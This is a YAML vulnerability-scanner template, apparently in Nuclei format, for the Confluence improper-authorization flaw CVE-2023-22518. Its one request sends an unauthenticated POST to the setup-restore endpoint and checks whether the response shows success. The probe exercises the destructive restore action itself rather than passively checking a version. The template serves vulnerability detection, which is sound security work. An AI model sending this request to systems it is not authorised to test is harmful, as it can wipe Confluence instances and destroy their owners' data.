id: cve-2023-22518-confluence
info:
  name: Confluence Data Center - Improper Authorization (CVE-2023-22518)
  author: cc-toolkit
  severity: critical
  description: Atlassian Confluence Data Center and Server - improper authorization allows unauthenticated attackers to wipe instances
  tags: cve, cve2023, confluence, atlassian

requests:
  - method: POST
    path:
      - "{{BaseURL}}/json/setup-restore.action?synchronous=true"
    headers:
      Content-Type: application/json
    body: '{"buildNumber":99999}'
    matchers:
      - type: word
        words:
          - "\"success\""
          - "restore"
        condition: or
---
